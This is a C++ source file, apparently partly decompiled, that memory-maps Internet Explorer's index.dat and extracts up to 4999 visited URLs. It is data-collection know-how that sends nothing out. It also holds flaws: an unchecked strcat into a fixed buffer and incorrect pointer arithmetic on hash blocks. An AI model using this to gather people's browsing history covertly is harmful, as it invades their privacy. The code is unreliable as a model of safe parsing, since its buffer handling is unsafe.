// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "IEHistory.hpp"

#include <cstdlib>

IEHistory::IEHistory(void)
{
	char szIE_HistoryIndex[260] = {};
	
	m_lpHistoryMapView = NULL;
	m_dwHistorySize = 0;
	
	HKEY hKey;
	if (!RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, KEY_EXECUTE, &hKey))
	{
		DWORD dwSize = 260;
		
		RegQueryValueEx(hKey, "History", NULL, NULL, (LPBYTE)szIE_HistoryIndex, &dwSize);
		RegCloseKey(hKey);
	}
	
	strcat(szIE_HistoryIndex, "\\History.IE5\\index.dat");
	m_lpHistoryMapView = Initialize(szIE_HistoryIndex);
}

IEHistory::~IEHistory()
{
	if (NULL != m_lpHistoryMapView)
		UnmapViewOfFile(m_lpHistoryMapView);
}

HANDLE IEHistory::Initialize(LPCSTR lpszFileName)
{
	HANDLE hFile = CreateFile(lpszFileName,
		GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (INVALID_HANDLE_VALUE == hFile)
		return NULL;
	
	HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, "MappingCache");
	if (NULL == hMap)
		return NULL;
	
	m_lpHistoryMapView = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
	if	(NULL == m_lpHistoryMapView)
		return NULL;
	
	m_dwHistorySize = *(DWORD *)((char*)m_lpHistoryMapView + 28);
	
	return m_lpHistoryMapView;
}

BOOL sub_10001264(void *lpMem, char *szPool, DWORD dwSize)
{
	const char *v3; // esi@3
	const char *v5; // esi@5
	size_t v6; // eax@6

	if (!memcmp(lpMem, "URL ", 4) && *((DWORD *)lpMem + 1) > 0 && (v3 = strstr((const char *)lpMem + 104, "@")) != 0)
	{
		v5 = v3 + 1;
		
		if (strlen(v5) + 1 >= dwSize - 1)
			v6 = dwSize - 1;
		else
			v6 = strlen(v5) + 1;
		
		memcpy(szPool, v5, v6);
		
		return TRUE;
	}
	
	return FALSE;
}

int IEHistory::GetHistory(WCHAR **lpszPool)
{
	if (NULL == m_lpHistoryMapView || 0 == m_dwHistorySize)
		return -1;
	
	DWORD lpHashRecord = *(DWORD *)((char*)m_lpHistoryMapView + 32);
	if (lpHashRecord == 0 || lpHashRecord > m_dwHistorySize)
		return -1;
	
	DWORD dwNext;
	DWORD k = 0;
	for (HASH_RECORD_HEADER *i = (HASH_RECORD_HEADER *)((char*)m_lpHistoryMapView + lpHashRecord); ; i = (HASH_RECORD_HEADER *)((char*)m_lpHistoryMapView + dwNext))
	{
		if (memcmp(i->szSignature, "HASH", 4))
			break;
		
		DWORD v7 = i->dwBlockCount;
		dwNext = i->dwNextRecord;
		
		HASH_RECORD_BLOCK *v9 = reinterpret_cast<HASH_RECORD_BLOCK*>(i + sizeof(HASH_RECORD_HEADER));
		WCHAR **v10 = &lpszPool[k];
		
		for (DWORD j = 0; j < 16 * v7; j++, v9++)
		{
			if (v9->dwUnknown == 0)
				break;
			
			if (v9->dwUnknown != 3)
			{
				if (v9->dwURLAddr && v9->dwURLAddr != 3 && v9->dwURLAddr < m_dwHistorySize)
				{
					char szURL[1024] = {};
					if (sub_10001264((char*)m_lpHistoryMapView + v9->dwURLAddr, szURL, 1024))
					{
						char *lpszBuf1 = strchr(szURL, '?');
						if (NULL != lpszBuf1)
							*lpszBuf1 = 0;
						
						char *lpszBuf2 = strchr(szURL, '/');
						if (NULL != lpszBuf2)
						{
							char *lpszBuf3 = strrchr(szURL, '/');
							if (NULL != lpszBuf3)
							{
								if (lpszBuf3 - lpszBuf2 == 1)
									strcat(szURL, "/");
							}
						}
						
						*v10 = new WCHAR[strlen(szURL) + 1];
						mbstowcs(*v10, szURL, strlen(szURL) + 1);
						
						++k;
						++v10;
					}
				}
				
				if (k >= 4999)
					return k;
			}
		}
		
		if (k < 4999)
		{
			if (dwNext && dwNext <= m_dwHistorySize)
				continue;
		}
	}
	
	return k;
}